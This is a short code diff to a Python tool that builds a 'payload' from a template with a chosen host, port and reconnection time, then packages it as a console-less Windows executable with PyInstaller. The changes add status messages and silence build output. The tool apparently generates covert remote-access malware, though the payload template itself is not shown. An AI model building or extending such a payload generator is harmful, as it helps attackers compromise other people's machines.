@@ -5,7 +5,9 @@ import platform
 import subprocess
 
 # absolute path
-source_file_path = os.path.abspath("module_builder/source_code.txt")
+current_directory = os.getcwd()
+source_file_path = os.path.join(current_directory, 'module_builder', 'source_code.txt')
+print(source_file_path)
 
 # colors
 red = "\033[31m"
@@ -24,6 +26,8 @@ def main(name, host, port, time):
 
     """ create a new payload file with the given name and set reconnection time """
 
+    print(f"{green}[*] Generating Payload, Please Wait...{reset}")
+    
     payload_name = name + '.py'
     source_file = open(source_file_path, 'r')
     payload_file = open(payload_name, 'w')
@@ -43,15 +47,17 @@ def main(name, host, port, time):
         file.close()
 
     command = f"pyinstaller --onefile --noconsole {payload_name}"
-    print(command)
+
+    print(f"{green}[*] Converting Payload into EXE {reset}")
 
     if platform.system() == 'Windows':
-        subprocess.run(command, shell=True, check=True)
+        subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     else:
-        subprocess.run(command, shell=True, check=True, executable='/bin/bash')
+        subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, executable='/bin/bash')
 
+    # removing file and dir after compiling
     os.remove(payload_name)
     os.remove(name + '.spec')
     shutil.rmtree("build")
 
-    print(f"{green}[*] Payload saved as {payload_name}{reset}")
+    print(f"{green}[*] Payload EXE file saved as {payload_name} in '/dist' directory.{reset}")
